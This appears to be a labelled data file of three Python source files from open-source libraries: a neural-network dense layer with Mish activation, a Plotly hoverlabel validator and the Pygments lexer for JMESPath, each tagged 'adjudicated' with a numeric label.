248	adjudicated	1	"# coding: utf8<<NEWL>>from __future__ import unicode_literals<<NEWL>>import numpy<<NEWL>><<NEWL>>from ... import describe<<NEWL>>from .model import Model<<NEWL>>from ...describe import Dimension, Synapses, Biases, Gradient<<NEWL>><<NEWL>><<NEWL>>def _set_dimensions_if_needed(model, X, y=None):<<NEWL>>    if model.nI is None:<<NEWL>>        model.nI = X.shape[1]<<NEWL>>    if model.nO is None and y is not None:<<NEWL>>        if len(y.shape) == 2:<<NEWL>>            model.nO = y.shape[1]<<NEWL>>        else:<<NEWL>>            model.nO = int(y.max()) + 1<<NEWL>><<NEWL>><<NEWL>>@describe.on_data(_set_dimensions_if_needed)<<NEWL>>@describe.attributes(<<NEWL>>    nB=Dimension(""Batch size""),<<NEWL>>    nI=Dimension(""Input size""),<<NEWL>>    nO=Dimension(""Output size""),<<NEWL>>    W=Synapses(<<NEWL>>        ""Weights matrix"",<<NEWL>>        lambda obj: (obj.nO, obj.nI),<<NEWL>>        lambda W, ops: ops.xavier_uniform_init(W),<<NEWL>>    ),<<NEWL>>    b=Biases(""Bias vector"", lambda obj: (obj.nO,)),<<NEWL>>    d_W=Gradient(""W""),<<NEWL>>    d_b=Gradient(""b""),<<NEWL>>)<<NEWL>>class Mish(Model):<<NEWL>>    """"""Dense layer with mish activation.<<NEWL>>    <<NEWL>>    https://arxiv.org/pdf/1908.08681.pdf<<NEWL>>    """"""<<NEWL>>    name = ""mish""<<NEWL>><<NEWL>>    @property<<NEWL>>    def input_shape(self):<<NEWL>>        return (self.nB, self.nI)<<NEWL>><<NEWL>>    @property<<NEWL>>    def output_shape(self):<<NEWL>>        return (self.nB, self.nO)<<NEWL>><<NEWL>>    def __init__(self, nO=None, nI=None, **kwargs):<<NEWL>>        Model.__init__(self, **kwargs)<<NEWL>>        self.nO = nO<<NEWL>>        self.nI = nI<<NEWL>>        self.drop_factor = kwargs.get(""drop_factor"", 1.0)<<NEWL>><<NEWL>>    def predict(self, X):<<NEWL>>        Y = self.ops.affine(self.W, self.b, X)<<NEWL>>        Y = self.ops.mish(Y)<<NEWL>>        return Y<<NEWL>><<NEWL>>    def begin_update(self, X, drop=0.0):<<NEWL>>        if drop is None:<<NEWL>>            return self.predict(X), None<<NEWL>>        Y1 = self.ops.affine(self.W, self.b, X)<<NEWL>>        Y2 = self.ops.mish(Y1)<<NEWL>>        drop *= self.drop_factor<<NEWL>>        Y3, bp_dropout = self.ops.dropout(Y2, drop)<<NEWL>><<NEWL>>        def finish_update(dY2, sgd=None):<<NEWL>>            dY1 = self.ops.backprop_mish(dY2, Y1)<<NEWL>>            self.ops.gemm(dY1, X, trans1=True, out=self.d_W)<<NEWL>>            self.d_b += dY1.sum(axis=0)<<NEWL>>            dX = self.ops.gemm(dY1, self.W)<<NEWL>>            if sgd is not None:<<NEWL>>                sgd(self._mem.weights, self._mem.gradient, key=self.id)<<NEWL>>            return dX<<NEWL>><<NEWL>>        return Y3, bp_dropout(finish_update)"
99	adjudicated	2	"import _plotly_utils.basevalidators<<NEWL>><<NEWL>><<NEWL>>class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):<<NEWL>>    def __init__(self, plotly_name=""hoverlabel"", parent_name=""treemap"", **kwargs):<<NEWL>>        super(HoverlabelValidator, self).__init__(<<NEWL>>            plotly_name=plotly_name,<<NEWL>>            parent_name=parent_name,<<NEWL>>            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),<<NEWL>>            data_docs=kwargs.pop(<<NEWL>>                ""data_docs"",<<NEWL>>                """"""<<NEWL>>            align<<NEWL>>                Sets the horizontal alignment of the text<<NEWL>>                content within hover label box. Has an effect<<NEWL>>                only if the hover label text spans more two or<<NEWL>>                more lines<<NEWL>>            alignsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `align`.<<NEWL>>            bgcolor<<NEWL>>                Sets the background color of the hover labels<<NEWL>>                for this trace<<NEWL>>            bgcolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bgcolor`.<<NEWL>>            bordercolor<<NEWL>>                Sets the border color of the hover labels for<<NEWL>>                this trace.<<NEWL>>            bordercolorsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `bordercolor`.<<NEWL>>            font<<NEWL>>                Sets the font used in hover labels.<<NEWL>>            namelength<<NEWL>>                Sets the default length (in number of<<NEWL>>                characters) of the trace name in the hover<<NEWL>>                labels for all traces. -1 shows the whole name<<NEWL>>                regardless of length. 0-3 shows the first 0-3<<NEWL>>                characters, and an integer >3 will show the<<NEWL>>                whole name if it is less than that many<<NEWL>>                characters, but if it is longer, will truncate<<NEWL>>                to `namelength - 3` characters and add an<<NEWL>>                ellipsis.<<NEWL>>            namelengthsrc<<NEWL>>                Sets the source reference on Chart Studio Cloud<<NEWL>>                for `namelength`.<<NEWL>>"""""",<<NEWL>>            ),<<NEWL>>            **kwargs,<<NEWL>>        )"
308	adjudicated	2	"""""""<<NEWL>>    pygments.lexers.jmespath<<NEWL>>    ~~~~~~~~~~~~~~~~~~~~~~~~<<NEWL>><<NEWL>>    Lexers for the JMESPath language<<NEWL>><<NEWL>>    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.<<NEWL>>    :license: BSD, see LICENSE for details.<<NEWL>>""""""<<NEWL>><<NEWL>>from pygments.lexer import RegexLexer, bygroups, include<<NEWL>>from pygments.token import String, Punctuation, Whitespace, Name, Operator, \<<NEWL>>    Number, Literal, Keyword<<NEWL>><<NEWL>>__all__ = ['JMESPathLexer']<<NEWL>><<NEWL>><<NEWL>>class JMESPathLexer(RegexLexer):<<NEWL>>    """"""<<NEWL>>    For JMESPath queries.<<NEWL>>    """"""<<NEWL>>    name = 'JMESPath'<<NEWL>>    url = 'https://jmespath.org'<<NEWL>>    filenames = ['*.jp']<<NEWL>>    aliases = ['jmespath', 'jp']<<NEWL>><<NEWL>>    tokens = {<<NEWL>>        'string': [<<NEWL>>            (r""'(\\(.|\n)|[^'\\])*'"", String),<<NEWL>>        ],<<NEWL>>        'punctuation': [<<NEWL>>            (r'(\[\?|[\.\*\[\],:\(\)\{\}\|])', Punctuation),<<NEWL>>        ],<<NEWL>>        'ws': [<<NEWL>>            (r"" |\t|\n|\r"", Whitespace)<<NEWL>>        ],<<NEWL>>        ""dq-identifier"": [<<NEWL>>            (r'[^\\""]+', Name.Variable),<<NEWL>>            (r'\\""', Name.Variable),<<NEWL>>            (r'.', Punctuation, '#pop'),<<NEWL>>        ],<<NEWL>>        'identifier': [<<NEWL>>            (r'(&)?("")', bygroups(Name.Variable, Punctuation), 'dq-identifier'),<<NEWL>>            (r'("")?(&?[A-Za-z][A-Za-z0-9_-]*)("")?', bygroups(Punctuation, Name.Variable, Punctuation)),<<NEWL>>        ],<<NEWL>>        'root': [<<NEWL>>            include('ws'),<<NEWL>>            include('string'),<<NEWL>>            (r'(==|!=|<=|>=|<|>|&&|\|\||!)', Operator),<<NEWL>>            include('punctuation'),<<NEWL>>            (r'@', Name.Variable.Global),<<NEWL>>            (r'(&?[A-Za-z][A-Za-z0-9_]*)(\()', bygroups(Name.Function, Punctuation)),<<NEWL>>            (r'(&)(\()', bygroups(Name.Variable, Punctuation)),<<NEWL>>            include('identifier'),<<NEWL>>            (r'-?\d+', Number),<<NEWL>>            (r'`', Literal, 'literal'),<<NEWL>>        ],<<NEWL>>        'literal': [<<NEWL>>            include('ws'),<<NEWL>>            include('string'),<<NEWL>>            include('punctuation'),<<NEWL>>            (r'(false|true|null)\b', Keyword.Constant),<<NEWL>>            include('identifier'),<<NEWL>>            (r'-?\d+\.?\d*([eE][-+]\d+)?', Number),<<NEWL>>            (r'\\`', Literal),<<NEWL>>            (r'`', Literal, '#pop'),<<NEWL>>        ]<<NEWL>>    }"
